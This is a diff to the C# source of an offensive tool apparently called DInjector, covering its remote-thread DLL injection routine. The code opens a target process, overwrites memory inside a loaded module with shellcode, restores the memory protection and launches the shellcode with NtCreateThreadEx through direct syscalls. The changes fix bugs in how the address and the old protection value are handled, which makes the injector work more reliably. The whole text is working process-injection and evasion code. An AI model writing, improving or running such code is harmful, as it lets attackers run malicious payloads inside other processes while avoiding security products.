@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 using DI = DInvoke;
+using static DInvoke.Data.Native;
 
 namespace DInjector
 {
@@ -22,7 +23,7 @@ namespace DInjector
                 ref oa,
                 ref ci);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadDll) [+] NtOpenProcess");
             else
                 Console.WriteLine($"(RemoteThreadDll) [-] NtOpenProcess: {ntstatus}");
@@ -37,17 +38,19 @@ namespace DInjector
                     #region NtProtectVirtualMemory (PAGE_READWRITE)
 
                     IntPtr baseAddress = module.BaseAddress + 4096;
+
+                    IntPtr protectAddress = baseAddress;
                     IntPtr regionSize = (IntPtr)shellcode.Length;
                     uint oldProtect = 0;
 
                     ntstatus = Syscalls.NtProtectVirtualMemory(
                         hProcess,
-                        ref baseAddress,
+                        ref protectAddress,
                         ref regionSize,
                         DI.Data.Win32.WinNT.PAGE_READWRITE,
                         ref oldProtect);
 
-                    if (ntstatus == 0)
+                    if (ntstatus == NTSTATUS.Success)
                         Console.WriteLine("(RemoteThreadDll) [+] NtProtectVirtualMemory, PAGE_READWRITE");
                     else
                         Console.WriteLine($"(RemoteThreadDll) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");
@@ -68,7 +71,7 @@ namespace DInjector
                         (uint)shellcode.Length,
                         ref bytesWritten);
 
-                    if (ntstatus == 0)
+                    if (ntstatus == NTSTATUS.Success)
                         Console.WriteLine("(RemoteThreadDll) [+] NtWriteVirtualMemory");
                     else
                         Console.WriteLine($"(RemoteThreadDll) [-] NtWriteVirtualMemory: {ntstatus}");
@@ -79,14 +82,18 @@ namespace DInjector
 
                     #region NtProtectVirtualMemory (oldProtect)
 
+                    protectAddress = baseAddress;
+                    regionSize = (IntPtr)shellcode.Length;
+                    uint tmpProtect = 0;
+
                     ntstatus = Syscalls.NtProtectVirtualMemory(
                         hProcess,
-                        ref baseAddress,
+                        ref protectAddress,
                         ref regionSize,
                         oldProtect,
-                        ref oldProtect);
+                        ref tmpProtect);
 
-                    if (ntstatus == 0)
+                    if (ntstatus == NTSTATUS.Success)
                         Console.WriteLine("(RemoteThreadDll) [+] NtProtectVirtualMemory, oldProtect");
                     else
                         Console.WriteLine($"(RemoteThreadDll) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
@@ -110,7 +117,7 @@ namespace DInjector
                         0,
                         IntPtr.Zero);
 
-                    if (ntstatus == 0)
+                    if (ntstatus == NTSTATUS.Success)
                         Console.WriteLine("(RemoteThreadDll) [+] NtCreateThreadEx");
                     else
                         Console.WriteLine($"(RemoteThreadDll) [-] NtCreateThreadEx: {ntstatus}");
